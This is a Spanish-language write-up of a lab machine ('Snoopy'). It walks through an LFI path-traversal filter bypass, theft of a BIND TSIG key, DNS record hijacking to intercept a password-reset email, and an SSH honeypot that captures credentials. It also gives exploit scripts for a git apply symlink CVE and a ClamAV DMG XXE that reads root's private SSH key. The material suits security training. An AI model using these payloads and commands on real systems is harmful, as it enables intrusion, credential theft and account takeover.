---
title: "Snoopy (Hard)"
date: 2026-11-07
author: "Isma"
slug: "snoopy"
tags: ["Linux", "DNS", "LFI", "Mattermost", "Password Reset", "SSH Honeypot", "Sudo", "CVE", "XXE", "ClamAV"]
categories: ["Machine", "CPTS Preparation"]
draft: false
source: "obsidian"
---

## Resumen

Snoopy es una máquina Linux de una empresa ficticia de DevSecOps (*SnoopySec*) en la que casi todo el camino consiste en encadenar piezas pequeñas. Una transferencia de zona DNS revela un Mattermost interno y la web avisa de que el servidor de correo `mail.snoopy.htb` está caído. Un **LFI** con un filtro de path traversal mal hecho me permite leer la configuración de **BIND** y robar la clave TSIG `rndc-key`, con la que puedo **añadir registros DNS**. Apunto `mail.snoopy.htb` a mi máquina, monto un Postfix y recibo el correo de **restablecimiento de contraseña** de Mattermost de `sbrown`. Dentro de Mattermost, un comando personalizado `/server_provision` hace que el usuario `cbrown` se conecte por SSH a la IP que yo indique: con un **honeypot SSH** capturo su contraseña. El movimiento lateral a `sbrown` abusa de una regla de `sudo` sobre `git apply` (**CVE-2023-23946**, escritura fuera del repositorio mediante symlinks) y la escalada final explota un **XXE en el parser DMG de ClamAV (CVE-2023-20052)** para leer la clave SSH privada de `root`.

## Reconocimiento

Empiezo con un escaneo de puertos:

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo tres puertos: SSH, una web en nginx y, lo más interesante, un **BIND 9 expuesto por TCP/53**. Un servidor DNS autoritativo accesible desde fuera es siempre candidato a una transferencia de zona.

### Transferencia de zona DNS

```bash
dig axfr snoopy.htb @10.129.229.5
```

![snoopy](/images/obsidian/snoopy/pasted-image-20260904162403.png)

La zona se transfiere sin restricciones y aparecen varios subdominios: `mm.snoopy.htb` (que apunta a localhost, es decir, servido por el mismo nginx), `mattermost`, `postgres` y `provisions` (en la red Docker `172.18.0.0/24`), además de `ns1`/`ns2`. Los añado a `/etc/hosts`.

### Web principal

La web es la página corporativa de SnoopySec:

![snoopy](/images/obsidian/snoopy/pasted-image-20260904162308.png)

En la página de contacto hay un aviso importante: están migrando registros DNS y el servidor de correo **`mail.snoopy.htb` está offline**. Me lo apunto, porque es justo un registro que *no* existe en la zona que acabo de descargar.

![snoopy](/images/obsidian/snoopy/pasted-image-20260904172232.png)

La sección del equipo da nombres y correos de empleados, entre ellos **Sally Brown (`sbrown@snoopy.htb`)**, que también aparece al final del vídeo de marketing:

![snoopy](/images/obsidian/snoopy/pasted-image-20260904163407.png)

### Mattermost (mm.snoopy.htb)

En `mm.snoopy.htb` hay un **Mattermost** que pide credenciales:

![snoopy](/images/obsidian/snoopy/pasted-image-20260904162908.png)

Si intento restablecer la contraseña de `sbrown@snoopy.htb`, la aplicación responde con un error: lógicamente, no puede enviar el correo porque el servidor de mail está caído.

![snoopy](/images/obsidian/snoopy/pasted-image-20260904172532.png)

## Acceso Inicial (Foothold)

### LFI en /download

En la portada hay dos enlaces "here" para descargar un paquete de prensa (un ZIP con un PDF y un vídeo) y un anuncio. El enlace apunta a un parámetro que elige el fichero, lo que pide a gritos probar un LFI:

![snoopy](/images/obsidian/snoopy/pasted-image-20260904163612.png)

```
http://snoopy.htb/download?file=announcement.pdf
```

El fuzzing de directorios no aporta mucho más (`download` y `download.php` son lo mismo):

![snoopy](/images/obsidian/snoopy/pasted-image-20260904164557.png)

Con `../` directo no funciona, pero con `....//` sí. El backend elimina las secuencias `../` **una sola vez y de forma no recursiva**: al quitar `../` de `....//` lo que queda es otra vez `../`. La respuesta no es el fichero en claro sino un **ZIP** (`press_release.zip`) que lo contiene:

```
GET /download?file=....//....//....//....//....//....//....//....//....//etc/passwd HTTP/1.1
Host: snoopy.htb
```

![snoopy](/images/obsidian/snoopy/vmware_kdueewx3on.png)

Tengo lectura arbitraria de ficheros. En `/etc/passwd` aparecen los usuarios `cbrown`, `sbrown`, `lpelt`, `cschultz`, `vgray` y una cuenta `clamav`.

### Robo de la clave TSIG de BIND

No encuentro nada directamente explotable, pero recuerdo que hay un BIND en el puerto 53, así que voy a por su configuración:

```
....//....//....//....//....//....//....//....//....//etc/bind/named.conf.local
```

```
zone "snoopy.htb" IN { type master; file "/var/lib/bind/db.snoopy.htb"; allow-update { key "rndc-key"; }; allow-transfer { 10.0.0.0/8; }; };
```

La zona tiene `allow-update` con la clave `rndc-key`: quien tenga esa clave puede **añadir, modificar o borrar registros** del dominio `snoopy.htb` mediante actualizaciones dinámicas (RFC 2136) firmadas con TSIG. Solo me falta la clave, que está en el fichero principal:

```
....//....//....//....//....//....//....//....//....//etc/bind/named.conf
```

```
include "/etc/bind/named.conf.options"; include "/etc/bind/named.conf.local"; include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
	algorithm hmac-sha256;
	secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

### Secuestro de mail.snoopy.htb

Guardo el bloque `key` en un fichero `rndc.key` y con `nsupdate` añado un registro A para `mail.snoopy.htb` apuntando a mi IP:

```bash
nsupdate -d -k rndc.key
```

```
server 10.129.229.5
zone snoopy.htb
update add mail.snoopy.htb 60 A 10.10.15.125
send
quit
```

![snoopy](/images/obsidian/snoopy/pasted-image-20260904173557.png)

El servidor responde `status: NOERROR`, así que la actualización firmada se acepta. Ahora, cuando Mattermost quiera enviar un correo a `@snoopy.htb`, resolverá el servidor de correo a mi máquina.

> **Nota**
> El TTL del registro es de solo 60 segundos y la zona puede volver a su estado original; si el correo no llega, conviene repetir el `nsupdate` justo antes de pedir el reset.

### Recibir el correo de reset con Postfix

Con Wireshark escuchando en `tun0` vuelvo a pedir el restablecimiento: ahora la máquina sí intenta conectar conmigo, pero las conexiones se rechazan porque no tengo ningún servidor SMTP escuchando.

![snoopy](/images/obsidian/snoopy/pasted-image-20260904174258.png)

Instalo y configuro un **Postfix** mínimo que acepte correo para `snoopy.htb` desde la red de la máquina:

```bash
sudo apt-get install postfix
sudo postconf -e "myhostname = snoopy.htb"
sudo postconf -e "mynetworks = 10.0.0.0/8"
sudo systemctl start postfix
```

Para que el correo se entregue, el destinatario tiene que existir como usuario local con su buzón:

```bash
sudo useradd sbrown
sudo touch /var/mail/sbrown; sudo chown sbrown:sbrown /var/mail/sbrown
```

Repito la petición y esta vez Mattermost confirma el envío:

![snoopy](/images/obsidian/snoopy/pasted-image-20260904175443.png)

El correo llega a `/var/mail/sbrown`:

![snoopy](/images/obsidian/snoopy/pasted-image-20260904175741.png)

```
Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3D6h14q=
39jyk19pri95xeiusj59o1a4do9a68k1pams4zoyhnpq1nw5cpaq5xxe76z )
```

Si pego el enlace tal cual, Mattermost se queja de que falta el token. El cuerpo viene en **quoted-printable**: `=3D` es un `=` codificado y el `=` al final de la línea es un salto de línea "blando". Al decodificarlo queda el enlace real:

![snoopy](/images/obsidian/snoopy/pasted-image-20260904175942.png)

```
http://mm.snoopy.htb/reset_password_complete?token=6h14q39jyk19pri95xeiusj59o1a4do9a68k1pams4zoyhnpq1nw5cpaq5xxe76z
```

Pongo una contraseña nueva (`password`) y entro como `sbrown`:

![snoopy](/images/obsidian/snoopy/pasted-image-20260904180104.png)

### Mattermost: el comando /server_provision

En el canal *Town Square* hablan de ClamAV (que ya usan en algunos servidores) y `cbrown` pide que los hosts para los que se solicita aprovisionamiento ya estén funcionando con su IPA, porque si no él "no podrá iniciar sesión". También se menciona un canal nuevo de *Server Provisioning*.

![snoopy](/images/obsidian/snoopy/pasted-image-20260904180118.png)

Entre los comandos de barra disponibles hay uno personalizado, **`/server_provision`**:

![snoopy](/images/obsidian/snoopy/pasted-image-20260904182847.png)

Abre un formulario que pide email, departamento, sistema operativo e **IP del servidor**:

![snoopy](/images/obsidian/snoopy/pasted-image-20260904182906.png)

La opción de Linux indica **TCP/2222**: alguien (o un script) va a intentar conectarse por SSH a la IP que yo ponga.

![snoopy](/images/obsidian/snoopy/pasted-image-20260904182948.png)

Lo envío con mi IP y, sin nada escuchando, `cbrown` me responde por mensaje directo que no ha podido conectar. En Wireshark veo las conexiones entrantes hacia mi puerto 2222.

![snoopy](/images/obsidian/snoopy/pasted-image-20260904183433.png)

### Captura de credenciales con un honeypot SSH

Si `cbrown` se autentica con contraseña contra un servidor SSH que controlo, puedo quedarme con ella. Uso **sshesame**, un honeypot SSH que acepta cualquier credencial y la registra:

```bash
git clone https://github.com/jaksi/sshesame
cd sshesame
sudo go build
sed -i 's/127.0.0.1:2022/0.0.0.0:2222/g' sshesame.yaml
systemctl stop ssh
./sshesame -config sshesame.yaml
```

Vuelvo a enviar el formulario. Esta vez `cbrown` dice que ha podido entrar en el servidor:

![snoopy](/images/obsidian/snoopy/pasted-image-20260904183540.png)

Y en el log del honeypot aparece su contraseña en claro (el cliente es `paramiko`, así que es un script automatizado):

![snoopy](/images/obsidian/snoopy/pasted-image-20260904183637.png)

```
cbrown : sn00pedcr3dential!!!
```

Con ella entro por SSH a la máquina real:

```bash
ssh cbrown@snoopy.htb
```

![snoopy](/images/obsidian/snoopy/pasted-image-20260904183718.png)

## Movimiento Lateral

### sudo sobre git apply (CVE-2023-23946)

`cbrown` puede ejecutar `git apply` como `sbrown`:

```
(sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```

La regex solo restringe el **nombre del fichero de patch** (alfanumérico y puntos, sin `/`), pero no su **contenido**. Y es el contenido del patch, con sus cabeceras `diff --git a/... b/...`, el que decide qué ficheros se crean o modifican.

Git tiene una protección: si un patch intenta escribir **directamente a través de un symlink** que apunta fuera del repositorio, lo rechaza como *"beyond a symbolic link"*. El truco (CVE-2023-23946, corregido en Git 2.39.2) es esquivarla en dos pasos dentro del mismo patch:

1. **Renombrar el symlink.** El patch dice que `symlink` pasa a llamarse `renamed-symlink`. Es solo un rename, así que no se dispara la protección; en disco sigue siendo el mismo enlace a `/home/sbrown/.ssh`.
2. **Crear un fichero "dentro" del nombre nuevo.** El patch añade `renamed-symlink/authorized_keys`. Git no comprueba que esa ruta atraviesa un symlink recién renombrado y simplemente la abre para escribir; el sistema operativo resuelve el enlace y el fichero acaba en `/home/sbrown/.ssh/authorized_keys`.

Como el contenido de `authorized_keys` también lo pongo yo, meto mi clave pública. Y como `git apply` corre como `sbrown`, el fichero se crea con el propietario correcto para que SSH lo acepte.

```bash
# directorio con permisos de escritura para todos
cd /dev/shm
umask 000
mkdir rce
cd rce

# repositorio con un symlink hacia el .ssh de sbrown
git init .
ln -s /home/sbrown/.ssh symlink
git add symlink
git commit -m "add symlink"

# par de claves que usaré para entrar
ssh-keygen -t ed25519 -f mykey -N ""

# patch malicioso: rename del symlink + fichero nuevo a través de él
cat > patch <<EOF
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
diff --git a/renamed-symlink/authorized_keys b/renamed-symlink/authorized_keys
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/authorized_keys
@@ -0,0 +1 @@
+$(cat mykey.pub)
EOF

# aplicar el patch como sbrown (el nombre "patch" cumple la regex)
sudo -u sbrown /usr/bin/git apply -v patch

# entrar como sbrown con la clave inyectada
ssh -i mykey sbrown@snoopy.htb
```

- https://nvd.nist.gov/vuln/detail/CVE-2023-23946

Ya soy `sbrown` y puedo leer la **User Flag**.

## Escalada de Privilegios

### sudo sobre clamscan

```bash
sudo -l
```

![snoopy](/images/obsidian/snoopy/pasted-image-20260905100746.png)

```
(root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
```

Puedo escanear como `root` cualquier fichero de `~/scanfiles` y, además, con `--debug`, que imprime mucha información interna del parseo. La conversación de Mattermost sobre ClamAV ya apuntaba hacia aquí.

### XXE en el parser DMG de ClamAV (CVE-2023-20052)

Las versiones vulnerables de ClamAV parsean el XML (plist) que llevan las imágenes de disco de macOS (**DMG**) sin desactivar las entidades externas. Si construyo un DMG cuyo plist declare una entidad `SYSTEM` apuntando a un fichero local y la uso dentro del documento, ClamAV la resuelve **como root** al escanearlo, y con `--debug` vuelca el valor resultante por pantalla.

- https://github.com/nokn0wthing/CVE-2023-20052
- https://nvd.nist.gov/vuln/detail/CVE-2023-20052

Siguiendo el PoC, en mi Kali (con `libdmg-hfsplus` compilado para tener la herramienta `dmg`) genero una imagen ISO y la convierto a DMG:

```bash
genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg
```

Después parcheo el DMG con `bbe`: sustituyo el `DOCTYPE` del plist por uno que declara la entidad `xxe` apuntando al fichero que quiero leer, y añado `&xxe;` justo después de la clave `blkx`, que es un valor que ClamAV imprime en modo debug:

```bash
bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg
```

Subo el DMG a `/home/sbrown/scanfiles/` (por ejemplo, sirviéndolo con un servidor HTTP en Python y descargándolo con `wget`) y lo escaneo con la regla de sudo:

```bash
sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg
```

Primero lo pruebo con `/etc/passwd` como fichero objetivo para confirmar que el XXE funciona: el contenido aparece en la línea `cli_scandmg: wanted blkx, text value is ...`.

![snoopy](/images/obsidian/snoopy/pasted-image-20260905103047.png)

Con la entidad apuntando a `/root/.ssh/id_rsa`, el debug me devuelve la **clave privada SSH de root**:

![snoopy](/images/obsidian/snoopy/pasted-image-20260905103502.png)

La guardo en un fichero, le doy permisos `600` y entro como root:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@snoopy.htb
```

Máquina comprometida y **Root Flag** capturada.

## Conclusiones

- Exponer un DNS autoritativo con transferencias de zona abiertas y, sobre todo, dejar la clave TSIG legible para el usuario web, convierte un LFI en control total del DNS. Con eso se pueden secuestrar flujos que dependen de él, como el correo de reset de contraseñas.
- Los filtros de path traversal que eliminan `../` una sola vez se saltan con `....//`. Hay que normalizar la ruta y comprobar que el resultado queda dentro del directorio permitido.
- Automatizaciones que inician sesión por SSH con contraseña contra IPs que elige el usuario son, en la práctica, un "envíame tu contraseña".
- Las reglas de `sudo` con regex sobre los argumentos dan una falsa sensación de control: limitan el nombre del fichero, no lo que el binario hace con su contenido (`git apply`, `clamscan`). Además, ambos binarios tenían CVE públicas.
